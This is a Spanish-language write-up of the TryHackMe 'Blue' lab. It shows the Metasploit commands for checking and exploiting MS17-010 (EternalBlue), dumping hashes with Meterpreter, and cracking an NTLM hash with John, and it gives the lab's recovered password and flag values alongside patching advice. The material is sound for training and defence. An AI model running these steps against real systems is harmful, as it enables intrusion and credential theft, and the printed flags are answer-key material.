# Blue — TryHackMe · Write-up

> **Plataforma:** TryHackMe · **Sala:** [Blue](https://tryhackme.com/room/blue) · **Dificultad:** Fácil
> **Autora:** Cyntia Zebaze ([github.com/Zebdon](https://github.com/Zebdon)) · **Fecha:** octubre 2026
> **Técnicas:** Reconocimiento · Explotación de SMB (EternalBlue / MS17-010) · Metasploit · Volcado de hashes · Crackeo NTLM (John) · Post-explotación

---

## 🎯 Resumen (TL;DR)

Máquina **Windows** comprometida explotando la vulnerabilidad **MS17-010 (EternalBlue)** en el servicio SMB (puerto 445) con Metasploit, obteniendo una sesión Meterpreter como **NT AUTHORITY\SYSTEM**. Después: volcado de los hashes de contraseñas, crackeo del hash NTLM de un usuario con John, y localización de las tres flags.

| Fase | Herramienta | Resultado |
|------|-------------|-----------|
| Reconocimiento | `nmap` | Windows Server 2012 R2; SMB (445) abierto |
| Verificación | `auxiliary/scanner/smb/smb_ms17_010` | Host VULNERABLE a MS17-010 |
| Explotación | `exploit/windows/smb/ms17_010_eternalblue` | sesión Meterpreter como **SYSTEM** |
| Post-explotación | `hashdump` | hashes NTLM de los usuarios |
| Cracking | `john --format=NT` | contraseña del usuario `Jon` |
| Flags | `search` + `cat` | 3 flags |

---

## 1. Reconocimiento

```bash
nmap -sV <IP_VICTIMA>
```

**Puertos abiertos (Windows):**

| Puerto | Servicio |
|--------|----------|
| 135 | msrpc |
| 139 | netbios-ssn |
| **445** | **microsoft-ds (SMB)** |
| 3389 | ms-wbt-server (RDP) |
| 49152–49155 | msrpc |

SO: **Windows Server 2012 R2**. El puerto **445 (SMB)** abierto en un Windows sin parchear es el objetivo clásico de EternalBlue.

---

## 2. Verificar la vulnerabilidad (MS17-010)

```
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP_VICTIMA>
run
```

Resultado:

```
[+] Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2
```

---

## 3. Explotación — EternalBlue

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_VICTIMA>
set LHOST <IP_ATACANTE>
exploit
```

Se abre la sesión y se confirma el máximo privilegio:

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> 🛡️ **Remediación:** aplicar el parche **MS17-010** (de 2017), deshabilitar **SMBv1**, y segmentar/filtrar el acceso al puerto 445 desde redes no confiables.

---

## 4. Post-explotación — volcado de hashes

```
meterpreter > hashdump
```

```
Administrator:500:...:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:...:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Usuario no estándar: **Jon** (RID 1002).

---

## 5. Crackeo del hash NTLM (John)

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon_hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
```

Contraseña recuperada de `Jon`: **`alqfna22`**

> 🛡️ **Remediación:** contraseñas robustas y algoritmos modernos; los hashes NTLM sin salt son rápidos de crackear con diccionario.

---

## 6. Flags

Búsqueda en todo el disco desde Meterpreter:

```
meterpreter > search -f flag*.txt
```

| Flag | Ubicación | Valor |
|------|-----------|-------|
| flag1 | `C:\flag1.txt` | `flag{access_the_machine}` |
| flag2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` |
| flag3 | `C:\Users\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |

Lectura (ojo a las barras dobles en las rutas):

```
cat "c:\\flag1.txt"
```

> 📌 Las tres flags siguen la narrativa del ataque: **acceder a la máquina** → **la base de datos SAM da privilegios** → **los documentos del usuario tienen valor**.

---

## 7. Lecciones aprendidas

- **Un solo puerto sin parchear basta:** SMBv1 con MS17-010 abierto da control total del sistema sin credenciales.
- **EternalBlue = SYSTEM directo:** no hace falta escalar; el exploit ya entrega el máximo privilegio.
- **Parchear es la defensa nº1:** el parche existía desde 2017; WannaCry/NotPetya aprovecharon equipos sin actualizar.
- **Hashes NTLM sin salt** se crackean en segundos con diccionario → contraseñas fuertes importan igual en Windows.
- **Enfoque defensivo:** parcheo al día, desactivar SMBv1, segmentación de red y monitorización de SMB habrían evitado todo.

---

<!-- Recuerda: añade este write-up a la tabla del README de tu repo thm-writeups. -->
